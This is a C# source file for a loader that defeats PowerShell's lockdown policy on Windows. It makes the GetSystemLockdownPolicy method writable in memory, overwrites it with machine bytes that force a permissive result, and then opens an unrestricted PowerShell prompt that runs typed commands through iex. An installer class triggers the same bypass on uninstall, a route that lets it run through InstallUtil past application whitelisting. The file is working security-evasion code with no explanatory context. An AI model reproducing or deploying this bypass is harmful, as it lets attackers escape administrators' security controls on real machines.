using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Runtime.ExceptionServices;
using System.IO;

namespace loader
{

    public class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [HandleProcessCorruptedStateExceptions]public static void Main()
        {
            go();
        }

        [HandleProcessCorruptedStateExceptions]public static void go()
        {
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);
            

            string[] cmd = new string[] { "while ($true){$cmd = Read-Host -Prompt \"PS:\"; if ($cmd -Contains \"exit\") { break} else { iex $cmd; \"`n\"}}" };
            while (true)
            {
                Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", cmd);
                break;
            }
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            MainClass.go();
        }
    }
}
